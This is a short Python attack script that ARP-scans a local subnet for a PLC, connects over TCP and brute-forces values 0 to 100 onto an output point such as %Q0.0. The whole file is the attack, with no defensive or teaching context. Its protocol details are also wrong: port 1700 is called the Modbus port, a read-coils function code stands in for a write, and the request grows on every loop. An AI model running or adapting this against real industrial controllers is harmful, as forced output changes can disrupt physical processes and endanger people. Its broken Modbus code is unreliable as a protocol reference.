import scapy.all as scapy
import socket
import struct
import time

# Define the PLC's IP address (will be discovered later)
plc_ip = None

# Define the PLC's port (e.g., Modbus TCP port 1700)
plc_port = 1700

# Define the timeout for the ARP scan
arp_timeout = 2

# Define the I/O point to brute force
io_point = "%Q0.0"  # Replace with the desired I/O point

# Define the range of values to brute force
start_value = 0
end_value = 100
step_value = 1

# Perform ARP scan to discover the PLC's IP address
def discover_plc_ip():
    global plc_ip
    arp_request = scapy.ARP(pdst="192.168.1.0/24")  # Replace with the subnet of your network
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=arp_timeout, verbose=False)[0]
    for element in answered_list:
        if element[1].psrc == "192.168.1.100":  # Replace with the expected IP address of the PLC
            plc_ip = element[1].psrc
            break

# Connect to the PLC and perform Brute Force I/O
def brute_force_io():
    global plc_ip
    if plc_ip is None:
        print("PLC IP address not found.")
        return

    # Create a socket object
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the PLC
    sock.connect((plc_ip, plc_port))

    # Send a request to the PLC to write the I/O point value
    # The request format may vary depending on the PLC's protocol (e.g., Modbus, BACnet, etc.)
    # For example, for Modbus TCP, the request to write the I/O point value could be:
    # 0x00 0x00 0x00 0x00 0x00 0x06 0x01 0x01 0x00 0x00 0x00 0x03
    write_request = b"\x00\x00\x00\x00\x00\x06\x01\x01\x00\x00\x00\x03"

    for value in range(start_value, end_value + 1, step_value):
        # Set the I/O point value
        write_request += struct.pack(">H", value)

        # Send the request to the PLC
        sock.send(write_request)

        # Receive the response from the PLC
        response = sock.recv(1024)

        # Check if the write was successful
        if response == b"\x00\x00\x00\x00\x00\x06\x01\x01\x00\x00\x00\x03":
            print(f"I/O point {io_point} set to {value}")
        else:
            print(f"Error setting I/O point {io_point} to {value}")

        # Wait for a short period of time before sending the next request
        time.sleep(0.1)

    # Close the socket
    sock.close()

# Call the functions
discover_plc_ip()
brute_force_io()